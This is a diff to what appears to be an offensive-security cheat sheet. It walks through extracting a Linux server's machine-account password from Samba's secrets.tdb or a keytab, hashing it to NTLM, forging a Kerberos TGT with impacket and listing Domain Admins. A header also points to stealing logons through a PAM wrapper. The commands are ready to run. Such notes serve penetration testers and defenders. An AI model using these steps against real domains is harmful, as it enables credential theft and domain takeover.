@@ -689,24 +689,24 @@ Obtain a copy of `/var/lib/samba/private/secrets.tdb` from the target computer.
 
 ```
 key(32) = "SECRETS/MACHINE_PASSWORD/MYDOMAIN.COM"
-data(121) = "sz2du[8=O<TICR&z?_Wr>nMtX1,hZl0iV45q75CXcWg3d]9)WT5Ftc6t)Rs>V)GKc,;Fg_VwyhPfS,vsw&lgI>Jo[d+VC\5CjBT]ITb0SkT/;f+QVrE;z5GDSF\00"
+data(121) = "sz2du[8=O<TICR&z?_Wr>nMtX1,hplpiV45q75CXcWg3d]9)WT5Ftc6t)Rs>V)GKc,;Fg_VwyhPfS,vsw&lgI>Jo[d+VC\5CjBT]ITb0SkT/;f+QVrE;z5GDSF\00"
 ```
 
 Create an NTLM hash from the password.
 
-`echo -n "sz2du[8=O<TICR&z?_Wr>nMtX1,hZl0iV45q75CXcWg3d]9)WT5Ftc6t)Rs>V)GKc,;Fg_VwyhPfS,vsw&lgI>Jo[d+VC\5CjBT]ITb0SkT/;f+QVrE;z5GDSF" | iconv -t utf-16le | openssl dgst -md4`
+`echo -n "sz2du[8=O<TICR&z?_Wr>nMtX1,hplpiV45q75CXcWg3d]9)WT5Ftc6t)Rs>V)GKc,;Fg_VwyhPfS,vsw&lgI>Jo[d+VC\5CjBT]ITb0SkT/;f+QVrE;z5GDSF" | iconv -t utf-16le | openssl dgst -md4`
 
-Output hash is `3eddac816b65852f193ac9b54e769a8c`
+Output hash is `f5024bd159c102b9d1da9c97cab22eae`
 
 Use impacket tool to create Kerberos TGT.
 
-`getTGT.py -hashes :3eddac816b65852f193ac9b54e769a8c -dc-ip 10.103.12.52 'mydomain.com/LINSVR-1$'`
+`getTGT.py -hashes :f5024bd159c102b9d1da9c97cab22eae -dc-ip 10.10.12.52 'mydomain.com/LINSVR-1$'`
 
 Copy `cp LINSVR-1\$.ccache` to `/tmp/krb5cc_0`
 
 List the members of "domain admins".
 
-`ldapsearch -Y GSSAPI -H ldap://10.103.12.52:3268 -b "DC=mydomain,DC=com" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=gci,dc=com))' | grep "distinguishedName:"`
+`ldapsearch -Y GSSAPI -H ldap://10.10.12.52:3268 -b "DC=mydomain,DC=com" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=mydomain,dc=com))' | grep "distinguishedName:"`
 
 **Method 2**
 
@@ -719,18 +719,18 @@ Recover the computer hash using `https://github.com/sosdave/KeyTabExtract/blob/m
 ```
 REALM : MYDOMAIN.COM
 SERVICE PRINCIPAL : LINSVR-1$/
-NTLM HASH : 3eddac816b65852f193ac9b54e769a8c
+NTLM HASH : f5024bd159c102b9d1da9c97cab22eae
 ```
 
 Use impacket tool to create Kerberos TGT.
 
-`getTGT.py -hashes :3eddac816b65852f193ac9b54e769a8c -dc-ip 10.103.12.52 'mydomain.com/LINSVR-1$'`
+`getTGT.py -hashes :f5024bd159c102b9d1da9c97cab22eae -dc-ip 10.10.12.52 'mydomain.com/LINSVR-1$'`
 
 Copy `cp LINSVR-1\$.ccache` to `/tmp/krb5cc_0`
 
 List the members of "domain admins".
 
-`ldapsearch -Y GSSAPI -H ldap://10.103.12.52:3268 -b "DC=mydomain,DC=com" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=gci,dc=com))' | grep "distinguishedName:"`
+`ldapsearch -Y GSSAPI -H ldap://10.10.12.52:3268 -b "DC=mydomain,DC=com" -s sub '(&(objectCategory=user)(memberOf=cn=Domain Admins,cn=Users,dc=mydomain,dc=com))' | grep "distinguishedName:"`
 
 ## >> Stealing logon credentials with a PAM wrapper
 
